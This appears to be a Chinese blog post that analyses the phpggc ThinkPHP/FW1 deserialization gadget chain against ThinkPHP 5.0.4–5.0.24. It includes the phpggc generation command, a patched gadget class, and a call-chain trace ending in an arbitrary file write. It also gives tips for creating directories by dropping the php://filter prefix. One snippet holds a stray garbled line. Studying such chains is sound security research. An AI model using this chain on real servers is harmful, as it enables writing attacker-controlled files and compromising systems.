---
title: phpggc thinkphp FW1
date: 2023-06-07 22:21:43
categories:
- PHP
tags:
- Deserialization
- thinkphp
toc: true
image:
  path: /assets/images/php.png
notshow: true
---

> - [php-反序列化格式基础](/posts/php-反序列化格式基础/)
- [php-反序列化绕过](/posts/php-反序列化绕过/)
- [php-反序列化字符逃逸](/posts/php-反序列化字符逃逸/)
- [php-phar-反序列化](/posts/php-phar-反序列化利用/)
- [php-反序列化原生类利用](/posts/php-反序列化原生类利用/)
- [phpggc-利用链分析](/posts/phpggc-thinkphp-利用链分析/)
  - thinkphp
    - [phpggc-thinkphp-RCE1](/posts/phpggc-thinkphp-RCE1/)
    - [phpggc-thinkphp-RCE2](/posts/phpggc-thinkphp-RCE2/)
    - [phpggc-thinkphp-RCE3](/posts/phpggc-thinkphp-RCE3/)
    - [phpggc-thinkphp-RCE4](/posts/phpggc-thinkphp-RCE4/)
    - [phpggc-thinkphp-FW1](/posts/phpggc-thinkphp-FW1/)
    - [phpggc-thinkphp-FW2](/posts/phpggc-thinkphp-FW2/)


## FW1
影响范围：
- thinkphp 5.0.4-5.0.24

### 使用
FW1 使用时需要提供两个参数，第一个参数用于指定写入的路径，第二个参数用于指定本地读取的文件。-b 参数用于将输出转为 base64。

```bash
phpggc ThinkPHP/FW1 /tmp/ /mnt/share/Tools/web/PHP/unserialize/phpggc/test/test.txt -b
```

github 上这条链原始的代码中还存在一个问题，HasMany 类中需要添加一行 `protected $query;` 源码中 `$query` 并不是一个 public 变量。
```php
namespace think\model\relation
{
    use think\console\Output;
    use think\model\Merge;
    use think\model\Relation;
    
    class HasMany extends Relation
    {
        protected $parent;
        protected $localKey = 'a';
        protected $pivot;
        protected $foreignKey;
        protected $query;

        public function __construct($path, $data)
        {
            $this->foreignKey = $data;
            $this->query = new Output($path, $data);
            $this->parent = new Merge();
        }
    }
}
```


### 分析
这条链的的流程如下：

```php
think\Process::__destruct()                                
    | $this->close()                                       
    | $this->processPipes->close()                         
    think\model\relation\HasMany::__call()                 
        | $this->baseQuery()                               
        | $this->query->where()        
        think\console\Output::__call()                     
            | call_user_func_array([$this, 'block'], $args)
            | $this->block()                               
            | $this->handle->write()                       
            think\session\driver\Memcache::write()         
                | $this->handler->set()                    
                think\cache\driver\Memcached::set()<-+     
                    | $this->handler->set()          |     
                    think\cache\driver\File::set()   |     
                        | $this->setTagItem()        |     
                        | $this->set()               |     
                        file_put_contents() * <----  |     
                    | $this->setTagItem()            |     
                    | $this->set()-------------------+       
```

总的来看整个利用链使用了五个类，最终走向了 file_put_contents。think\cache\driver\File::set 函数在调用 file_put_contents 函数时，需要 `$filename`, `$data` 两个参数.

```php
public function set($name, $value, $expire = null)
{
    ...
    $filename = $this->getCacheKey($name, true);
    ...
    $data = serialize($value);
    ...
    $data   = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;
    $result = file_put_contents($filename, $data);
    if ($result) {
        isset($first) && $this->setTagItem($filename);
    ...
}
```
- `$data` 来源于`$value` 序列化后的内容, 最终会和 `$expire` 参数做一个拼接，`$expire` 在 sprintf 的作用下会变成数字，因此 `$expire` 的值即使控制也没什么用。
- `$filename`来自于 getCacheKey 函数传入 `$name`的结果，该函数首先进行了一个 md5, 然后作了一个拼接,因此`$this->options['path']` 是可以控制的.
  ```php
  $name = md5($name);
  $filename = $this->options['path'] . $name . '.php';
  ```

两个参数都是可控的，下一步就是找到哪里调用了 set 方法，可以直接在 phpstorm 中查找 `->set(` ，也就是调用了某个属性的 set 方法，且传入参数的数量 >= 3（在 PHP 中，如果你调用一个函数并传入比函数定义要求的更多的参数，那么多余的参数将被忽略。PHP 不会因为传入了多余的参数而抛出错误或警告。），满足条件的其实很多，参数个数恰好为 3 的只有下面的这一个，phpggc 中也是用的这个
 - `think\cache\driver\Memcached::set()` 

`think\cache\driver\Memcached::set()` 中调用 `$this->handler->set` 时传入的 $value 直接来自于上一个 gadget。
```php
public function set($name, $value, $expire = null)
{
    ...
    if ($this->tag && !$this->has($name)) {
        $first = true;
    }
    $key    = $this->getCacheKey($name);
    ...
    if ($this->handler->set($key, $value, $expire)) {
        isset($first) && $this->setTagItem($key);
        return true;
    }
    return false;
}
```
再往上寻找 gadget 时同样可以搜索 `->set(`， phpggc 使用的是 `think\session\driver\Memcache::write()` ,因此 `$value` 的值来自于 `$sessData`
```php
public function write($sessID, $sessData)
{think\console\Output
    return $this->handler->set($this->config['session_name'] . $sessID, $sessData, 0, $this->config['expire']);
}
```
具体找利用链的过程大致如此，就 phpggc 这条链来看, 继续往上溯源发现 `$sessData` 来源于在 `think\console\Ouput::write` 中的 `$newline`, 而 `$newline` 来自于 `think\console\Ouput::writeln` 中，值为 true。这么一看， value 值似乎就是不可控制的。

```php
public function writeln($messages, $type = self::OUTPUT_NORMAL)
{
    $this->write($messages, true, $type);
}

public function write($messages, $newline = false, $type = self::OUTPUT_NORMAL)
{
    $this->handle->write($messages, $newline, $type);
}
```

最终这条链能够控制 `$value` 的地方在于,`think\cache\driver\Memcached::set()` 方法在调用完 `$this->handler->set()` 后调用了 `$this->setTagItem($key)`，传入参数为 `$key`，这个参数的内容是我们所控制的，代码如下：
```php
public function set($name, $value, $expire = null)
{
    ...
    if ($this->handler->set($key, $value, $expire)) {
        isset($first) && $this->setTagItem($key); /****here***/
        return true;
    }
    return false;
}
```
setTagItem 函数中会用 `$name` 对 `$value` 进行赋值，此时 `$value` 的值就是可控的了，这时调用 set 方法，就会再次调用 file_put_content 写入.
```php
protected function setTagItem($name)
{
    if ($this->tag) {
        $key       = 'tag_' . md5($this->tag);
        $this->tag = null;
        if ($this->has($key)) {
            $value   = explode(',', $this->get($key));
            $value[] = $name;
            $value   = implode(',', array_unique($value));
        } else {
            $value = $name;
        }
        $this->set($key, $value, 0);
    }
}
```
注意：
1. 由于两次调用 set 方法时传入的第一个参数不一样，因此在指定的目录下会创建两个文件。
2. phpggc 中的利用链默认情况下不能写入一个不存在的目录，例如 /tmp/test/, 如果 test 目录不存在，则无法写入，但 getCacheKey 函数中存在创建目录并更改权限为 755 的代码, 由于 phpggc 默认传入的 $filename 带有 php://filter 前缀，因此运行 mkdir 时无法正常创建.
   ```php
    $filename = $this->options['path'] . $name . '.php';
    $dir      = dirname($filename);

    if ($auto && !is_dir($dir)) {
        mkdir($dir, 0755, true);
    }
   ```
   因此，在如果要创建目录的话，可以将原 payload 中的 php://filer 前缀去掉。


## 参考
- [phpggc详解](https://skysec.top/2019/08/02/phpggc%E8%AF%A6%E8%A7%A3/)
- [ThinkPHP5反序列化利用链总结与分析](https://www.freebuf.com/vuls/317886.html)
- [浅谈ThinkPH5.0和5.1的反序列化利用链分析](https://juejin.cn/post/7049323076676239367#heading-14)

